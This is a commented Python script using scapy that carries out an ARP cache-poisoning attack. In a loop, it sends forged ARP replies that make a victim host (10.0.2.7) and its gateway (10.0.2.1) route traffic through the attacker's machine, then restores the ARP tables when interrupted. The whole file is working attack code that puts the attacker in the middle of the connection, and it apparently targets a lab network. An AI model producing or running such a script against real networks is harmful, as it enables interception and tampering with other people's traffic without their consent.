import scapy.all as scapy
import time
import sys

# Function to get the MAC address of a given IP
def get_mac(ip):
    # Create an ARP request packet for the target IP
    arp_request = scapy.ARP(pdst=ip)
    # Create an Ethernet frame with a broadcast destination MAC address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Combine the Ethernet frame and ARP request
    arp_request_broadcast = broadcast/arp_request
    # Send the packet and receive the response
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # Check if we got a response
    if len(answered_list) == 0:
        print(f"Could not find MAC address for IP: {ip}")
        sys.exit(1)

    # Return the MAC address from the first response
    return answered_list[0][1].hwsrc

# Function to send a spoofed ARP reply
def spoof(target_ip, spoof_ip):
    # Get the MAC address of the target IP
    target_mac = get_mac(target_ip)
    # Create an ARP reply packet with the spoofed information
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Send the packet
    scapy.send(packet)

# Function to restore the original ARP table entries
def restore(target_ip, source_ip):
    # Get the MAC addresses of the target and source IPs
    target_mac = get_mac(target_ip) 
    source_mac = get_mac(source_ip)
    # Create an ARP reply packet to restore the original mapping
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    # Send the packet multiple times to ensure it is received
    scapy.send(packet, count=4, verbose=False)

# Main script execution
try:
    # Loop to continuously send spoofed ARP replies
    while True:
        # Spoof the victim to believe the attacker is the gateway
        spoof("10.0.2.7", "10.0.2.1") # The spoof function sends an ARP reply to the victim, associating the gateway IP with the attacker's MAC address.
        # Spoof the gateway to believe the attacker is the victim
        spoof("10.0.2.1", "10.0.2.7") # This function is designed to make the device at 10.0.2.1 (the gateway) believe that the IP address 10.0.2.7 (the victim) is at the attacker's MAC address.
        # Wait for 2 seconds before sending the next set of packets
        time.sleep(2)
except KeyboardInterrupt:
    # Handle the interrupt signal (CTRL+C) to stop the script
    print("Detected CTRL+C. Restoring ARP tables...")
    # Restore the ARP table entries for the victim and the gateway
    restore("10.0.2.7", "10.0.2.1") 
    restore("10.0.2.1", "10.0.2.7")
    print("ARP tables restored.")
    # Exit the script
    sys.exit(0)


"""
Continuous Sending: The loop ensures continuous sending of spoofed ARP packets to maintain the poisoning.
Error Handling: If the script is interrupted (e.g., by pressing CTRL+C), it restores the ARP tables to their correct state.
Improvements: Added error handling for when the MAC address cannot be found, and the ARP restoration logic to clean up after the attack.
"""

